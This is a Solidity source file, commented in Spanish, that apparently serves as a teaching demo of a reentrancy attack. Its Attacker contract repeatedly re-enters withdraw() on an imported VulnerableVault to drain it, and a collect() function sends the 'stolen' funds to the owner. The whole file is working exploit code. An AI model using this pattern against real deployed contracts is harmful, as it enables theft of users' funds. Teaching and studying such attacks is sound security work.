// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./vulnerable/VulnerableVault.sol";

/// @title Attacker - Contrato que explota la reentrancy en VulnerableVault
/// @notice Este contrato demuestra como funciona un ataque de reentrancy:
///
///         1. El atacante deposita una pequena cantidad de ETH en el vault
///         2. Llama withdraw(), que envia ETH al atacante
///         3. La funcion receive() del atacante se ejecuta ANTES de que
///            VulnerableVault actualice el balance
///         4. Dentro de receive(), se llama withdraw() de nuevo
///         5. Como el balance aun no se actualizo, pasa la validacion
///         6. Se repite hasta vaciar el vault
contract Attacker {
    VulnerableVault public vault;
    address public owner;

    event AttackStarted(uint256 amount);
    event ReentryTriggered(uint256 vaultBalance);

    constructor(address _vault) {
        vault = VulnerableVault(payable(_vault));
        owner = msg.sender;
    }

    /// @notice Ejecuta el ataque de reentrancy
    /// @dev Requiere enviar algo de ETH como deposito inicial
    function attack() external payable {
        require(msg.value > 0, "Need ETH");
        emit AttackStarted(msg.value);

        // Depositar ETH para tener un balance valido
        vault.deposit{value: msg.value}();

        // Primera llamada a withdraw - esto dispara la cadena de reentrancy
        vault.withdraw();
    }

    /// @notice Callback que se ejecuta cuando el vault envia ETH
    /// @dev Aqui esta la magia del ataque: re-entramos en withdraw()
    ///      antes de que el vault actualice nuestro balance a 0.
    receive() external payable {
        // Seguir drenando mientras el vault tenga fondos
        // y nuestro balance registrado sea > 0 (que siempre lo es
        // porque el vault aun no actualizo el estado)
        if (address(vault).balance >= vault.balances(address(this))) {
            emit ReentryTriggered(address(vault).balance);
            vault.withdraw();
        }
    }

    /// @notice Permite al owner retirar los fondos robados
    function collect() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    /// @notice Retorna el balance del contrato atacante
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
